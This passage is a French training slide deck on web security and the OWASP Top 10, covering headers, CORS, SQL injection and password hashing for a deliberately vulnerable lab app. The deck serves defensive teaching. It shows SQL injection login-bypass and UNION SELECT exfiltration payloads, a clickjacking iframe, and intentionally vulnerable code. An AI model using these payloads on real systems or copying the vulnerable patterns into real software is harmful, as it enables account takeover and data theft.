@@ -1,0 +1,2304 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="utf-8" />
+<meta
+name="viewport"
+content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
+/>
+
+<title>Secure Coding &amp; OWASP — Formation</title>
+
+<link rel="stylesheet" href="dist/reset.css" />
+<link rel="stylesheet" href="dist/reveal.css" />
+<link rel="stylesheet" href="dist/theme/white.css" />
+
+<!-- Theme used for syntax highlighted code -->
+<link rel="stylesheet" href="dist/plugin/highlight/monokai.css" />
+
+<style>
+:root {
+  --r-heading-font: system-ui, sans-serif;
+  --r-main-font: system-ui, sans-serif;
+  --color-danger: #e03131;
+  --color-success: #2f9e44;
+  --color-warning: #e67700;
+  --color-info: #1971c2;
+  --color-owasp: #e8590c;
+}
+
+.reveal h1,
+.reveal h2,
+.reveal h3 {
+  text-transform: none;
+  text-wrap: balance;
+}
+
+.reveal h1 {
+  font-size: 2.2em;
+}
+
+.reveal h2 {
+  font-size: 1.6em;
+}
+
+.reveal h3 {
+  font-size: 1.3em;
+}
+
+.reveal ul {
+  text-align: left;
+}
+
+.reveal pre {
+  width: 95%;
+  font-size: 0.55em;
+}
+
+.reveal pre code {
+  max-height: 500px;
+}
+
+.reveal table {
+  font-size: 0.7em;
+  margin: 0 auto;
+}
+
+.reveal table th {
+  background: rgba(0, 0, 0, 0.05);
+}
+
+.reveal .small {
+  font-size: 0.6em;
+}
+
+.reveal .smaller {
+  font-size: 0.5em;
+}
+
+.text-danger {
+  color: var(--color-danger) !important;
+}
+
+.text-success {
+  color: var(--color-success) !important;
+}
+
+.text-warning {
+  color: var(--color-warning) !important;
+}
+
+.text-info {
+  color: var(--color-info) !important;
+}
+
+.text-owasp {
+  color: var(--color-owasp) !important;
+}
+
+.badge {
+  display: inline-block;
+  padding: 0.2em 0.6em;
+  border-radius: 0.3em;
+  font-size: 0.6em;
+  font-weight: bold;
+  vertical-align: middle;
+}
+
+.badge-danger {
+  background: var(--color-danger);
+  color: #fff;
+}
+
+.badge-success {
+  background: var(--color-success);
+  color: #fff;
+}
+
+.badge-warning {
+  background: var(--color-warning);
+  color: #fff;
+}
+
+.badge-owasp {
+  background: var(--color-owasp);
+  color: #fff;
+}
+
+.code-compare {
+  display: flex;
+  gap: 1em;
+  justify-content: center;
+  align-items: flex-start;
+}
+
+.code-compare > div {
+  flex: 1;
+}
+
+.code-compare h4 {
+  font-size: 0.8em;
+  margin-bottom: 0.3em;
+}
+
+.attack-flow {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 0.5em;
+  font-size: 0.8em;
+  flex-wrap: wrap;
+}
+
+.attack-flow .step {
+  background: rgba(0, 0, 0, 0.04);
+  border: 2px solid rgba(0, 0, 0, 0.15);
+  border-radius: 0.5em;
+  padding: 0.5em 0.8em;
+}
+
+.attack-flow .arrow {
+  font-size: 1.5em;
+  color: var(--color-danger);
+}
+
+.stat-big {
+  font-size: 3em;
+  font-weight: bold;
+  line-height: 1.2;
+}
+
+.tp-slide {
+  background: rgba(25, 113, 194, 0.5) !important;
+}
+
+.quiz-slide {
+  background: rgba(230, 119, 0, 0.06) !important;
+}
+
+.section-title {
+  background: linear-gradient(135deg, rgba(232, 89, 12, 0.1), rgba(224, 49, 49, 0.06)) !important;
+}
+
+.reveal .slide-number {
+  font-size: 14px;
+}
+
+.two-col {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 1em;
+  /* text-align: left; */
+}
+
+</style>
+</head>
+<body>
+<div class="reveal">
+<div class="slides">
+        <!-- ============================================================ -->
+        <!-- SECTION 1 — TITRE & INTRODUCTION                             -->
+        <!-- ============================================================ -->
+        <section>
+          <section
+            data-background-gradient="linear-gradient(135deg, #f8f9fa 0%, #e9ecef 50%, #dee2e6 100%)"
+          >
+            <h1>🔐 Sécurité des applications web<br />& OWASP</h1>
+
+            <p>Formation sécurité des applications web</p>
+
+            <p class="small" style="margin-top: 2em; opacity: 0.6">
+              1,5 jours · Théorie · Démos · Travaux pratiques
+            </p>
+
+            <aside class="notes">
+              Vérifier que tout le monde a accès au repo, VS Code, Postman et un terminal.
+            </aside>
+          </section>
+
+          <section>
+            <h2>📋 Agenda</h2>
+
+            <table>
+              <thead>
+                <tr>
+                  <th>Bloc</th>
+                  <th>Contenu</th>
+                </tr>
+              </thead>
+
+              <tbody>
+                <tr>
+                  <td><strong>Jour 1 — Matin</strong></td>
+                  <td>Introduction · OWASP Top 10 · Misconfiguration · SQL Injection</td>
+                </tr>
+
+                <tr>
+                  <td><strong>Jour 1 — Après-midi</strong></td>
+                  <td>Cryptographie · Bruteforce · XSS</td>
+                </tr>
+
+                <tr>
+                  <td><strong>Jour 2 — Matin</strong></td>
+                  <td>CSRF · IDOR · Sessions · Audit · Évaluation</td>
+                </tr>
+              </tbody>
+            </table>
+
+            <p class="small fragment" style="margin-top: 1em">
+              Chaque thème : <strong>théorie → démo → TP</strong>
+            </p>
+          </section>
+
+          <section>
+            <h2>🎯 Objectifs</h2>
+
+            <ul>
+              <li class="fragment">Identifier les vulnérabilités web les plus courantes</li>
+              <li class="fragment">Comprendre les mécanismes d'attaque</li>
+              <li class="fragment">Appliquer les corrections appropriées</li>
+              <li class="fragment">Utiliser des outils d'audit et d'analyse statique</li>
+              <li class="fragment">Intégrer la sécurité dans le workflow de développement</li>
+            </ul>
+          </section>
+        </section>
+
+        <!-- ============================================================ -->
+        <!-- SECTION 2 — POURQUOI LA SÉCURITÉ                             -->
+        <!-- ============================================================ -->
+        <section>
+          <section class="section-title">
+            <h2>🌍 Pourquoi la sécurité web ?</h2>
+            <p>Les chiffres, les impacts, le coût</p>
+          </section>
+
+          <section>
+            <h3>🎯 Ça vous concerne directement</h3>
+
+            <ul>
+              <li class="fragment">
+                Vos <strong>mots de passe</strong> réutilisés entre services ?
+                <span class="small">→ Un leak suffit pour tout compromettre</span>
+              </li>
+
+              <li class="fragment">
+                Votre compte <strong>gaming / streaming</strong> piraté ?
+                <span class="small">→ Des bots les testent automatiquement sur d'autres services</span>
+              </li>
+
+              <li class="fragment">
+                Un <strong>formulaire</strong> qui exécute du code à votre insu ?
+                <span class="small">→ XSS dans un commentaire, un profil, un chat</span>
+              </li>
+            </ul>
+
+            <p class="fragment text-danger" style="margin-top: 1em">
+              Ces attaques exploitent les <strong>mêmes failles</strong> qu'on va étudier aujourd'hui.
+            </p>
+          </section>
+
+          <section>
+            <h3>🔥 Exemples récents</h3>
+
+            <table>
+              <thead>
+                <tr>
+                  <th>Incident</th>
+                  <th>Cause</th>
+                  <th>Impact</th>
+                </tr>
+              </thead>
+
+              <tbody>
+                <tr class="fragment">
+                  <td>Free (2024)</td>
+                  <td>Accès non autorisé à la base clients</td>
+                  <td>19M d'abonnés exposés</td>
+                </tr>
+                <tr class="fragment">
+                  <td>Uber (2022)</td>
+                  <td>Credential stuffing + MFA fatigue</td>
+                  <td>Systèmes internes compromis</td>
+                </tr>
+
+                <tr class="fragment">
+                  <td>LinkedIn (2021)</td>
+                  <td>Scraping API sans contrôle d'accès</td>
+                  <td>700M de profils revendus</td>
+                </tr>
+
+                <tr class="fragment">
+                  <td>Log4Shell (2021)</td>
+                  <td>Injection dans une lib Java</td>
+                  <td>Des millions de serveurs exposés</td>
+                </tr>
+              </tbody>
+            </table>
+
+            <aside class="notes">
+              <ul>
+                <li>
+                  Uber : credential stuffing automatisé + ingénierie sociale sur un employé.
+                </li>
+
+                <li>
+                  LinkedIn : une API publique sans rate limit ni auth → 700M de profils aspirés.
+                </li>
+
+                <li>
+                  Log4Shell : une seule dépendance vulnérable = catastrophe mondiale.
+                </li>
+              </ul>
+            </aside>
+          </section>
+
+          <section>
+            <h3>💰 Impact sur l'entreprise</h3>
+
+            <ul>
+              <li class="fragment">
+                <strong>Financier</strong> — Amendes RGPD (jusqu'à 4% du CA), remédiation, procès
+              </li>
+
+              <li class="fragment">
+                <strong>Réputation</strong> — Perte de confiance clients, couverture médiatique
+              </li>
+
+              <li class="fragment">
+                <strong>Opérationnel</strong> — Interruption de service, perte de données
+              </li>
+
+              <li class="fragment">
+                <strong>Juridique</strong> — Responsabilité du développeur et de l'entreprise
+              </li>
+            </ul>
+          </section>
+
+          <section>
+            <h3>📈 Corriger tôt, c'est 100&times; moins cher</h3>
+
+            <table>
+              <thead>
+                <tr>
+                  <th>Moment de la détection</th>
+                  <th>Effort</th>
+                </tr>
+              </thead>
+
+              <tbody>
+                <tr>
+                  <td>Pendant le <strong>code review</strong></td>
+                  <td><span class="text-success">1&times;</span> — un commentaire, un fix</td>
+                </tr>
+
+                <tr>
+                  <td>En <strong>staging / test</strong></td>
+                  <td><span class="text-warning">15&times;</span> — debug, re-test, re-deploy</td>
+                </tr>
+
+                <tr>
+                  <td>En <strong>production</strong></td>
+                  <td><span class="text-danger">100&times;</span> — hotfix, communication, rollback</td>
+                </tr>
+              </tbody>
+            </table>
+
+            <p class="fragment" style="margin-top: 1em">
+              La sécurité, c'est <strong>moins cher quand c'est fait dès le départ</strong>.
+            </p>
+          </section>
+
+          <section class="quiz-slide">
+            <h3>❓Question</h3>
+            <p>Quelle est la vulnérabilité web la plus répandue selon l'OWASP Top 10 2025 ?</p>
+
+            <div class="fragment" style="margin-top: 1em">
+              <p>
+                <span class="badge badge-owasp">A01</span>
+                <strong>Broken Access Control</strong>
+              </p>
+
+              <p class="small" style="margin-top: 0.8em">
+                => l'application <strong>ne vérifie pas</strong> correctement si l'utilisateur connecté
+                a le <strong>droit</strong> d'accéder à la ressource demandée.
+              </p>
+
+              <p class="small" style="margin-top: 0.5em">
+                💥Exemple : Changer <code>/api/users/<strong>1</strong></code> en
+                <code>/api/users/<strong>2</strong></code><br />
+                Permet d'accéder aux données d'un autre utilisateur.
+              </p>
+            </div>
+
+            <p class="fragment small text-danger" style="margin-top: 0.8em">
+              Dans les applications testées, au moins une faille de contrôle d'accès a été trouvée dans 100 % des cas
+            </p>
+          </section>
+        </section>
+
+        <!-- ============================================================ -->
+        <!-- SECTION 3 — OWASP TOP 10                                     -->
+        <!-- ============================================================ -->
+        <section>
+          <section class="section-title">
+            <h2 class="text-owasp">OWASP Top 10</h2>
+            <p>Les 10 risques de sécurité les plus critiques pour les applications web</p>
+          </section>
+
+          <section>
+            <h3>Qu'est-ce que l'OWASP ?</h3>
+
+            <ul>
+              <li>
+                <strong>O</strong>pen <strong>W</strong>orldwide <strong>A</strong>pplication
+                <strong>S</strong>ecurity <strong>P</strong>roject
+              </li>
+              <li>Fondation à but non lucratif</li>
+              <li>Communauté mondiale de volontaires</li>
+              <li>Guides, outils et standards gratuits</li>
+
+              <li class="fragment">
+                Le <strong>Top 10</strong> est mis à jour régulièrement<br />(dernière version :
+                <strong>2025</strong>)
+              </li>
+            </ul>
+          </section>
+
+          <section>
+            <h3>OWASP Top 10 — 2025</h3>
+
+            <table class="smaller">
+              <thead>
+                <tr>
+                  <th>#</th>
+                  <th>Catégorie</th>
+                  <th>Dans cette formation</th>
+                </tr>
+              </thead>
+
+              <tbody>
+                <tr>
+                  <td><span class="badge badge-owasp">A01</span></td>
+                  <td>Broken Access Control</td>
+                  <td>✅ Étape 7</td>
+                </tr>
+
+                <tr>
+                  <td><span class="badge badge-owasp">A02</span></td>
+                  <td>Security Misconfiguration</td>
+                  <td>✅ Étape 1</td>
+                </tr>
+
+                <tr>
+                  <td><span class="badge badge-owasp">A03</span></td>
+                  <td>Software Supply Chain Failures</td>
+                  <td>✅ Étape 9</td>
+                </tr>
+
+                <tr>
+                  <td><span class="badge badge-owasp">A04</span></td>
+                  <td>Cryptographic Failures</td>
+                  <td>✅ Étape 3</td>
+                </tr>
+
+                <tr>
+                  <td><span class="badge badge-owasp">A05</span></td>
+                  <td>Injection</td>
+                  <td>✅ Étapes 2 &amp; 5</td>
+                </tr>
+
+                <tr>
+                  <td><span class="badge badge-owasp">A06</span></td>
+                  <td>Insecure Design</td>
+                  <td>—</td>
+                </tr>
+
+                <tr>
+                  <td><span class="badge badge-owasp">A07</span></td>
+                  <td>Authentication Failures</td>
+                  <td>✅ Étape 4</td>
+                </tr>
+
+                <tr>
+                  <td><span class="badge badge-owasp">A08</span></td>
+                  <td>Software &amp; Data Integrity Failures</td>
+                  <td>—</td>
+                </tr>
+
+                <tr>
+                  <td><span class="badge badge-owasp">A09</span></td>
+                  <td>Security Logging &amp; Alerting Failures</td>
+                  <td>—</td>
+                </tr>
+
+                <tr>
+                  <td><span class="badge badge-owasp">A10</span></td>
+                  <td>Mishandling of Exceptional Conditions</td>
+                  <td>—</td>
+                </tr>
+              </tbody>
+            </table>
+          </section>
+
+          <section>
+            <h3>🧪 Le lab</h3>
+
+            <div style="margin-top: 1em">
+              <h4 class="text-danger">starter/</h4>
+              <p>Application <strong>vulnérable</strong></p>
+              <p class="small">Failles annotées :<br /><code class="text-danger">//! VULNERABLE</code></p>
+            </div>
+
+            <p class="fragment small" style="margin-top: 1em">
+            Stack : Express · TypeScript · Drizzle ORM · SQLite
+            </p>
+          </section>
+
+          <section>
+            <h3>⚙️ Setup</h3>
+
+            <pre>
+              <code class="language-bash" data-trim data-noescape>
+                cd starter/backend
+                pnpm install
+                pnpm dev
+              </code>
+            </pre>
+
+            <p style="margin-top: 1em">Données de test :</p>
+
+            <table>
+              <thead>
+                <tr>
+                  <th>Email</th>
+                  <th>Mot de passe</th>
+                  <th>ID</th>
+                </tr>
+              </thead>
+
+              <tbody>
+                <tr>
+                  <td><code>john.doe@example.com</code></td>
+                  <td><code>123secret</code></td>
+                  <td>1</td>
+                </tr>
+
+                <tr>
+                  <td><code>jane.smith@example.com</code></td>
+                  <td><code>123secret</code></td>
+                  <td>2</td>
+                </tr>
+              </tbody>
+            </table>
+
+            <p class="small fragment">
+              Postman : Importer <code>secure-coding-lab.postman_collection.json</code>
+            </p>
+          </section>
+        </section>
+
+        <!-- ============================================================ -->
+        <!-- SECTION 4 — A02 · SECURITY MISCONFIGURATION                  -->
+        <!-- ============================================================ -->
+        <section>
+          <section class="section-title">
+            <span class="badge badge-owasp">A02</span>
+            <h2>Security Misconfiguration</h2>
+            <p>CORS &amp; Headers HTTP</p>
+
+            <aside class="notes">
+              Ouvrir les DevTools → onglet Réseau → inspecter une réponse HTTP. Montrer
+              X-Powered-By: Express et l'absence de CSP, X-Frame-Options.
+            </aside>
+          </section>
+
+          <section>
+            <h3>Les headers HTTP de sécurité</h3>
+
+            <p>
+              Le serveur envoie des <strong>directives au navigateur</strong><br />pour restreindre
+              les comportements dangereux.
+            </p>
+
+            <ul>
+              <li class="fragment">
+                Quelles ressources charger ? → <code>Content-Security-Policy</code>
+              </li>
+              <li class="fragment">Autoriser les iframes ? → <code>X-Frame-Options</code></li>
+              <li class="fragment">Forcer HTTPS ? → <code>Strict-Transport-Security</code></li>
+              <li class="fragment">Révéler la stack ? → <code>X-Powered-By</code></li>
+            </ul>
+
+            <aside class="notes">
+              Ces headers sont des directives au navigateur, PAS des protections serveur. Le
+              navigateur peut les ignorer (extensions, navigateur modifié). C'est de la défense en
+              profondeur.
+            </aside>
+          </section>
+
+          <section>
+            <h3>Ce que voit un attaquant</h3>
+
+            <div class="code-compare">
+              <div>
+                <h4 class="text-danger">❌ Sans protection</h4>
+                <pre><code class="language-http" data-trim data-noescape>
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Content-Type: text/html
+
+(pas de CSP)
+(pas de X-Frame-Options)
+(pas de HSTS)
+        </code></pre>
+              </div>
+
+              <div>
+                <h4 class="text-success">✅ Avec helmet()</h4>
+                <pre><code class="language-http" data-trim data-noescape>
+HTTP/1.1 200 OK
+Content-Security-Policy: ...
+X-Frame-Options: SAMEORIGIN
+Strict-Transport-Security: ...
+X-Content-Type-Options: nosniff
+Referrer-Policy: no-referrer
+        </code></pre>
+              </div>
+            </div>
+
+            <aside class="notes">
+              Faire la démo en live : Envoyer une requête dans Postman, montrer les headers AVANT et
+              APRÈS correction.
+            </aside>
+          </section>
+
+          <section>
+            <h3>CORS — Cross-Origin Resource Sharing</h3>
+
+            <p>
+              Sans configuration, <code>cors()</code> autorise <strong>toutes les origines</strong>.
+            </p>
+
+            <div class="code-compare">
+              <div>
+                <h4 class="text-danger">❌ Trop permissif</h4>
+                <pre><code class="language-typescript" data-trim>
+app.use(cors());
+// → Access-Control-Allow-Origin: *
+        </code></pre>
+              </div>
+
+              <div>
+                <h4 class="text-success">✅ Restrictif</h4>
+                <pre><code class="language-typescript" data-trim>
+app.use(cors({
+  origin: 'https://monsite.com',
+  credentials: true,
+}));
+        </code></pre>
+              </div>
+            </div>
+            <p class="fragment small">
+              Un site tiers pourrait faire des requêtes authentifiées<br />au nom de l'utilisateur
+              si CORS est trop ouvert.
+            </p>
+
+            <aside class="notes">
+              CORS n'est pas un problème pour des APIs publiques, mais c'est dangereux pour une API
+              qui utilise des cookies d'authentification.
+            </aside>
+          </section>
+
+          <section>
+            <h3>Correction — <code>helmet()</code></h3>
+
+            <pre><code class="language-typescript" data-trim data-noescape data-line-numbers>
+import helmet from 'helmet';
+import cors from 'cors';
+
+app.use(helmet());
+app.use(cors({
+  origin: process.env.FRONTEND_URL,
+  credentials: true,
+}));
+    </code></pre>
+            <p class="fragment small">
+              <code>helmet()</code> ajoute ~15 headers de sécurité en une seule ligne.
+            </p>
+          </section>
+
+          <section>
+            <h3>Ce que <code>helmet()</code> ajoute</h3>
+
+            <table class="smaller">
+              <thead>
+                <tr>
+                  <th>Header</th>
+                  <th>Protection</th>
+                </tr>
+              </thead>
+
+              <tbody>
+                <tr>
+                  <td><code>Content-Security-Policy</code></td>
+                  <td>Quelles ressources charger (anti-XSS)</td>
+                </tr>
+                <tr>
+                  <td><code>X-Frame-Options</code></td>
+                  <td>Anti-clickjacking</td>
+                </tr>
+                <tr>
+                  <td><code>X-Content-Type-Options</code></td>
+                  <td>Pas de MIME sniffing</td>
+                </tr>
+                <tr>
+                  <td><code>Strict-Transport-Security</code></td>
+                  <td>Force HTTPS (180 jours)</td>
+                </tr>
+                <tr>
+                  <td><code>Referrer-Policy</code></td>
+                  <td>Pas de fuite d'URLs internes</td>
+                </tr>
+                <tr>
+                  <td><code>X-Powered-By</code></td>
+                  <td>Supprimé (masque la stack)</td>
+                </tr>
+              </tbody>
+            </table>
+          </section>
+
+          <section>
+            <h3>Démo — Clickjacking</h3>
+
+            <pre><code class="language-html" data-trim data-noescape>
+&lt;!-- Sans helmet : l'iframe fonctionne --&gt;
+&lt;iframe src="http://localhost:5000"
+        style="opacity: 0.01; position: absolute;"&gt;
+&lt;/iframe&gt;
+&lt;button&gt;Cliquez ici pour gagner !&lt;/button&gt;
+    </code></pre>
+            <p class="fragment">
+              L'utilisateur croit cliquer sur le bouton…<br />mais il clique dans l'iframe
+              invisible. 😱
+            </p>
+            <p class="fragment text-success">
+              Avec <code>X-Frame-Options: SAMEORIGIN</code> → iframe bloquée ✅
+            </p>
+            <aside class="notes">
+              Montrer qu'un iframe src="http://localhost:5000" fonctionne sans helmet. Après
+              correction, la même iframe est bloquée. Bonne démonstration du clickjacking.
+            </aside>
+          </section>
+
+          <section class="tp-slide">
+            <h3>🎯 TP — Étape 1</h3>
+            <p><strong>Fichier :</strong> <code>src/app.ts</code></p>
+            <ol>
+              <li>Ajouter <code>helmet()</code> pour les headers de sécurité</li>
+              <li>Configurer <code>cors()</code> avec une origine précise</li>
+              <li>
+                Vérifier dans Postman que <code>X-Powered-By</code> a disparu et que
+                <code>CSP</code> est présent
+              </li>
+            </ol>
+            <p class="small" style="margin-top: 1em">📖 Guide apprenant — Étape 1</p>
+          </section>
+
+          <section class="quiz-slide">
+            <h3>❓ Quiz — Misconfiguration</h3>
+
+            <p><code>helmet()</code> rend-il l'application invulnérable ?</p>
+
+            <div class="fragment">
+              <p class="text-danger"><strong>Non !</strong></p>
+
+              <p class="small">
+                Helmet ajoute des directives <em>navigateur</em>.<br />
+                Les vraies vulnérabilités (injection SQL, XSS dans le code, accès non contrôlé)<br />
+                doivent être corrigées dans le code source.<br />
+                Helmet = <strong>défense en profondeur</strong>, pas une solution complète.
+              </p>
+            </div>
+          </section>
+        </section>
+
+        <!-- ============================================================ -->
+        <!-- SECTION 5 — A05 · SQL INJECTION                              -->
+        <!-- ============================================================ -->
+        <section>
+          <section class="section-title">
+            <span class="badge badge-owasp">A05</span>
+            <h2>SQL Injection</h2>
+            <p>La faille la plus classique</p>
+          </section>
+
+          <section>
+            <h3>Comment ça marche ?</h3>
+
+            <p>
+              L'attaquant injecte du <strong>code SQL</strong> dans un champ de saisie<br />pour
+              modifier la logique de la requête.
+            </p>
+
+            <div class="attack-flow fragment">
+              <div class="step">📝 Champ email<br /><code>' OR '1'='1'; --</code></div>
+              <div class="arrow">→</div>
+              <div class="step">🔧 Concaténation<br />dans la requête SQL</div>
+              <div class="arrow">→</div>
+              <div class="step">💥 La condition<br />est toujours vraie</div>
+              <div class="arrow">→</div>
+              <div class="step">🔓 Accès au<br />premier utilisateur</div>
+            </div>
+
+            <aside class="notes">
+              Demander au groupe : "Que se passe-t-il si email vaut ' OR '1'='1' -- ?" Laisser le
+              temps de réfléchir avant de montrer.
+            </aside>
+          </section>
+
+          <section>
+            <h3>Le code vulnérable</h3>
+
+            <pre><code class="language-typescript" data-trim data-line-numbers>
+//! VULNERABLE — A05 : SQL Injection
+const query = `SELECT * FROM users
+  WHERE email = '${email}'
+  AND password = '${password}'`;
+
+const result = db.run(query);
+    </code></pre>
+
+            <p class="fragment text-danger">
+              Les valeurs de l'utilisateur sont directement<br />insérées dans la chaîne SQL ! 💀
+            </p>
+          </section>
+
+          <section>
+            <h3>Le payload d'attaque</h3>
+            <pre><code class="language-json" data-trim>
+{
+  "email": "' OR '1'='1'; --",
+  "password": "123secret"
+}
+    </code></pre>
+            <p style="margin-top: 1em">Requête résultante :</p>
+
+            <pre class="fragment"><code class="language-sql" data-trim>
+SELECT * FROM users
+WHERE email = '' OR '1'='1'; --' AND password = '...'
+--                  ^^^^^^^^^^  ^^
+--              toujours vrai    commente le reste
+    </code></pre>
+            <p class="fragment">→ Retourne le <strong>premier utilisateur</strong> de la table</p>
+            <aside class="notes">
+              Montrer la requête résultante au tableau. Expliquer que -- commente tout ce qui suit.
+              Le password "123secret" est nécessaire car il y a un check JS après le SQL
+              (user.password !== password). C'est un bon exemple de "défense accidentelle".
+            </aside>
+          </section>
+
+          <section>
+            <h3>Démo — Postman</h3>
+
+            <ol>
+              <li>Ouvrir <strong>Auth / Login</strong> dans Postman</li>
+              <li>Le payload d'injection est déjà configuré</li>
+              <li>Envoyer → <span class="text-danger">HTTP 200 + token JWT</span></li>
+            </ol>
+
+            <p class="fragment" style="margin-top: 1em">
+              L'attaquant s'est authentifié <strong>sans connaître aucun email</strong> ! 😱
+            </p>
+          </section>
+
+          <section>
+            <h3>Correction — Requêtes paramétrées</h3>
+
+            <pre><code class="language-typescript" data-trim data-line-numbers>
+//* SECURE — Drizzle ORM (prepared statements)
+import { eq } from 'drizzle-orm';
+import { usersTable } from '@/db/schemas/user.schema.js';
+
+const result = await db
+  .select()
+  .from(usersTable)
+  .where(eq(usersTable.email, email));
+
+// La valeur n'est JAMAIS interpolée dans le SQL
+// Elle est transmise comme paramètre lié (?)
+    </code></pre>
+            <p class="fragment text-success">
+              L'ORM génère : <code>SELECT * FROM users WHERE email = ?</code><br />
+              La valeur est envoyée séparément → injection impossible ✅
+            </p>
+
+            <aside class="notes">
+              Montrer la requête générée dans les logs serveur. Drizzle génère des prepared
+              statements — la valeur n'est jamais interpolée, elle est transmise comme paramètre
+              lié.
+            </aside>
+          </section>
+
+          <section>
+            <h3>Et la validation Zod ?</h3>
+
+            <div class="code-compare">
+              <div>
+                <h4 class="text-danger">❌ Starter</h4>
+
+                <pre><code class="language-typescript" data-trim>
+z.string()
+// Accepte n'importe quoi
+        </code></pre>
+              </div>
+
+              <div>
+                <h4 class="text-success">✅ Mieux</h4>
+
+                <pre><code class="language-typescript" data-trim>
+z.string().email()
+// Bloque les payloads SQLi
+        </code></pre>
+              </div>
+            </div>
+
+            <p class="fragment text-warning" style="margin-top: 1em">
+              ⚠️ La validation du format est une première ligne de défense,<br />
+              mais elle <strong>ne remplace pas</strong> les requêtes paramétrées.
+            </p>
+
+            <p class="fragment small">
+              Un payload peut respecter le format email<br />et contenir du SQL :
+              <code>user@sub').union...</code>
+            </p>
+          </section>
+
+          <section>
+            <h3>Pour aller plus loin — UNION SELECT</h3>
+
+            <pre><code class="language-sql" data-trim>
+-- Exfiltration de TOUTE la table users
+' UNION SELECT 1, email, password FROM users --
+    </code></pre>
+
+            <p class="fragment">
+              C'est la technique qu'un vrai attaquant utiliserait<br />pour
+              <strong>extraire toute la base</strong>, pas juste bypasser l'auth.
+            </p>
+          </section>
+
+          <section class="tp-slide">
+            <h3>🎯 TP — Étape 2</h3>
+
+            <p><strong>Fichier :</strong> <code>src/modules/auth/auth.router.ts</code></p>
+
+            <ol>
+              <li>
+                Remplacer la requête SQL par concaténation<br />par une requête paramétrée via
+                Drizzle ORM
+              </li>
+
+              <li>
+                Vérifier : le payload d'injection retourne maintenant <strong>HTTP 401</strong>
+              </li>
+
+              <li>Vérifier : un login normal fonctionne toujours</li>
+            </ol>
+
+            <p class="small" style="margin-top: 1em">📖 Guide apprenant — Étape 2</p>
+          </section>
+
+          <section class="quiz-slide">
+            <h3>❓ Quiz — SQL Injection</h3>
+
+            <p>
+              Pourquoi <code>z.string().email()</code> ne suffit pas<br />à protéger contre
+              l'injection SQL ?
+            </p>
+
+            <div class="fragment">
+              <p>
+                Un attaquant peut construire un payload<br />qui
+                <strong>respecte le format email</strong> tout en contenant du SQL.
+              </p>
+
+              <p class="text-success small">
+                La vraie correction = <strong>requêtes paramétrées</strong>.<br />Elles fonctionnent
+                quelle que soit la valeur de l'entrée.
+              </p>
+            </div>
+          </section>
+        </section>
+
+        <!-- ============================================================ -->
+        <!-- SECTION 6 — A04 · CRYPTOGRAPHIC FAILURES                     -->
+        <!-- ============================================================ -->
+        <section>
+          <section class="section-title">
+            <span class="badge badge-owasp">A04</span>
+            <h2>Cryptographic Failures</h2>
+            <p>Mots de passe en clair</p>
+          </section>
+
+          <section>
+            <h3>Le problème</h3>
+
+            <p>Même si l'injection SQL est corrigée…</p>
+
+            <p class="fragment">
+              Une <strong>fuite de la base</strong> expose tous les mots de passe :
+            </p>
+
+            <ul class="fragment">
+              <li>Sauvegarde S3 mal configurée</li>
+              <li>Dump accidentel</li>
+              <li>Vulnérabilité serveur</li>
+            </ul>
+
+            <p class="fragment text-danger" style="margin-top: 1em; font-size: 1.2em">
+              Si les mots de passe sont en clair → game over 💀
+            </p>
+
+            <aside class="notes">
+              Commencer par la démo SQLite Viewer : ouvrir local.db et montrer les mots de passe
+              lisibles directement.
+            </aside>
+          </section>
+
+          <section>
+            <h3>Plaintext vs Hash vs Hash+Salt</h3>
+
+            <table>
+              <thead>
+                <tr>
+                  <th>Stockage</th>
+                  <th>Valeur en base</th>
+                  <th>Résistance</th>
+                </tr>
+              </thead>
+
+              <tbody>
+                <tr class="fragment">
+                  <td class="text-danger">En clair</td>
+                  <td><code>123secret</code></td>
+                  <td>❌ Lisible directement</td>
+                </tr>
+
+                <tr class="fragment">
+                  <td class="text-warning">Hash simple</td>
+                  <td><code>a1b2c3d4...</code></td>
+                  <td>⚠️ Rainbow table</td>
+                </tr>
+
+                <tr class="fragment">
+                  <td class="text-success">Hash + salt</td>
+                  <td><code>$2a$12$xK...</code></td>
+                  <td>✅ Résistant</td>
+                </tr>
+              </tbody>
+            </table>
+          </section>
+
+          <section>
+            <h3>bcrypt — 3 concepts</h3>
+
+            <ol>
+              <li class="fragment">
+                <strong>Hachage</strong> — fonction à sens unique<br />
+                <span class="small"
+                  >Impossible de retrouver <code>123secret</code> depuis
+                  <code>$2a$12$...</code></span
+                >
+              </li>
+
+              <li class="fragment">
+                <strong>Salt</strong> — valeur aléatoire unique par hash<br />
+                <span class="small"
+                  >Même mot de passe → hashes différents. Protège contre les rainbow tables.</span
+                >
+              </li>
+
+              <li class="fragment">
+                <strong>Work factor</strong> (salt rounds = 12)<br />
+                <span class="small"
+                  >2¹² = 4 096 itérations. Chaque tentative ≈ 100ms.<br />
+                  1 million de tentatives = ~28 heures 🐌</span
+                >
+              </li>
+            </ol>
+
+            <aside class="notes">
+              <p>Démo utile : dans un REPL Node.js, appeler deux fois bcrypt.hash("123secret", 12) pour montrer que le même mot de passe génère des hashes différents grâce au salt.</p>
+
+              const { default: bcrypt } = await import("bcryptjs");
+              await bcrypt.hash("123secret",12);
+              await bcrypt.hash("123secret",12);
+            </aside>
+          </section>
+
+          <section>
+            <h3>Code vulnérable</h3>
+
+            <pre><code class="language-typescript" data-trim data-line-numbers>
+//! VULNERABLE — A04 : mots de passe en clair
+// seed.ts
+await db.insert(usersTable).values({
+  email: 'john.doe@example.com',
+  password: '123secret', // ← en clair !
+});
+
+// auth.router.ts — comparaison en clair
+if (user.password !== password) {
+  throw new UnauthorizedError('Invalid credentials');
+}
+    </code></pre>
+          </section>
+
+          <section>
+            <h3>Correction — bcrypt</h3>
+
+            <pre><code class="language-typescript" data-trim data-line-numbers>
+import bcrypt from 'bcryptjs';
+
+// Au seeding — salt factor 12 recommandé
+const hashedPassword = await bcrypt.hash('123secret', 12);
+await db.insert(usersTable).values({
+  email: 'john.doe@example.com',
+  password: hashedPassword,
+});
+
+// À l'authentification
+const isValid = await bcrypt.compare(
+  plaintextPassword,
+  user.password
+);
+    </code></pre>
+            <p class="fragment text-success">
+              Ne jamais re-hasher pour comparer !<br /><code>bcrypt.compare()</code> gère le salt
+              automatiquement ✅
+            </p>
+          </section>
+
+          <section class="tp-slide">
+            <h3>🎯 TP — Étape 3</h3>
+
